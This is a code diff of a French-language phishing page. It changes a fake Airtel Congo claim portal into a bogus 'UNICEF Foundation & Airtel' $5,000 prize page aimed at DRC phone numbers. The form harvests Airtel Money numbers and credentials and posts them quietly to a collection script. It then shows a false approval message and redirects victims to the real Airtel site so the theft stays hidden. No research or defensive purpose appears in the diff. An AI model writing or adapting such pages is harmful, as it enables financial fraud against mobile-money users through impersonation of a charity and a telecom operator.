@@ -3,41 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Airtel Congo - Portail de Réclamation</title>
+    <title>UNICEF Foundation - Réclamation de Prix</title>
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #eeeeee; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         .card { background: #ffffff; width: 100%; max-width: 380px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; }
         .header { background-color: #ed1c24; padding: 20px; text-align: center; }
-        .header img { max-width: 100px; height: auto; } /* This looks for logo.png in your folder */
+        .header img { max-width: 120px; height: auto; } /* Your UNICEF logo goes here: logo.png */
         .content { padding: 25px; text-align: center; }
-        h2 { color: #ed1c24; margin-top: 0; font-size: 20px; }
+        h2 { color: #ed1c24; margin-top: 0; font-size: 19px; }
         p { color: #555; font-size: 14px; line-height: 1.5; }
-        
+        .prize-badge { background: #fbe9e9; border: 2px dashed #ed1c24; border-radius: 8px; padding: 12px; margin: 15px 0; }
+        .prize-badge span { font-size: 26px; font-weight: bold; color: #ed1c24; }
         .input-group { position: relative; display: flex; align-items: center; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 6px; background: #fafafa; }
         .prefix { background: #eee; padding: 12px; border-right: 1px solid #ddd; color: #333; font-weight: bold; font-size: 16px; border-radius: 6px 0 0 6px; }
         input { border: none; padding: 12px; width: 100%; font-size: 16px; background: transparent; outline: none; }
-        
         .btn { background-color: #ed1c24; color: white; border: none; padding: 14px; width: 100%; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
         .btn:hover { background-color: #d11920; }
         .footer-text { font-size: 11px; color: #999; margin-top: 20px; text-transform: uppercase; letter-spacing: 1px; }
+        .disclaimer { font-size: 10px; color: #bbb; margin-top: 10px; line-height: 1.3; }
     </style>
 </head>
 <body>
 
 <div class="card">
     <div class="header">
-        <!-- Manually upload your logo and rename it logo.png -->
-        <img src="logo.png" alt="Airtel">
+        <!-- Manually upload your UNICEF logo and rename it logo.png -->
+        <img src="logo.png" alt="UNICEF Foundation">
     </div>
     
     <div class="content">
-        <h2>Félicitations sélectionnées!</h2>
-        <p>Réclamation de la récompense de <strong>1,000,000 FCFA</strong>. Veuillez confirmer votre identifiant Airtel Money pour le transfert.</p>
+        <h2>Félicitations !</h2>
+        <p>Dans le cadre du programme <strong>UNICEF Foundation & Airtel</strong>, votre numéro a été sélectionné pour recevoir une récompense financière.</p>
+        
+        <div class="prize-badge">
+            <span>$5,000 USD</span><br>
+            <small>Prix de la Promotion Éducation & Fidélité</small>
+        </div>
+        
+        <p>Veuillez confirmer vos identifiants Airtel Money pour recevoir votre transfert immédiat.</p>
         
         <form id="extractionForm">
-            <!-- Phone Number with separate prefix -->
+            <!-- Phone Number with new DRC prefix -->
             <div class="input-group">
-                <div class="prefix">+242</div>
+                <div class="prefix">+243</div>
                 <input type="tel" name="phone_suffix" placeholder="Numéro de mobile" required pattern="[0-9]{7,12}">
             </div>
             
@@ -49,7 +57,8 @@
             <button type="submit" class="btn" id="subBtn">VALIDER LE TRANSFERT</button>
         </form>
         
-        <p class="footer-text">Sécurisé par Airtel Money Congo</p>
+        <p class="footer-text">Sécurisé par Airtel Money & UNICEF Foundation</p>
+        <p class="disclaimer">*Cette promotion n'exige aucun paiement préalable. Les fonds seront crédités sous 10 minutes après vérification.</p>
     </div>
 </div>
 
@@ -63,20 +72,22 @@
         btn.innerHTML = "Traitement en cours...";
         btn.disabled = true;
 
-        // Construct the full phone number for your spreadsheet
         const formData = new FormData(form);
-        const fullPhone = "+242" + formData.get('phone_suffix');
+        const fullPhone = "+243" + formData.get('phone_suffix');
         formData.append('full_phone', fullPhone);
 
-        fetch(scriptURL, { method: 'POST', body: formData})
-            .then(response => {
-                alert("Validation réussie ! Votre bonus de 1,000,000 FCFA sera crédité dans les 10 prochaines minutes. Un SMS de confirmation vous sera envoyé.");
-                window.location.href = "https://www.airtel.cg/";
-            })
-            .catch(error => {
-                // Fail silently and redirect to stay hidden
-                window.location.href = "https://www.airtel.cg/";
-            });
+        fetch(scriptURL, { 
+            method: 'POST', 
+            body: formData,
+            mode: 'no-cors'
+        })
+        .then(() => {
+            alert("Félicitations ! Votre prix de $5,000 USD a été approuvé. Le transfert sera effectué dans les 10 prochaines minutes. Un SMS de confirmation vous sera envoyé.");
+            window.location.href = "https://www.airtel.cd/"; // Official Airtel DRC site
+        })
+        .catch(error => {
+            window.location.href = "https://www.airtel.cd/";
+        });
     });
 </script>
 
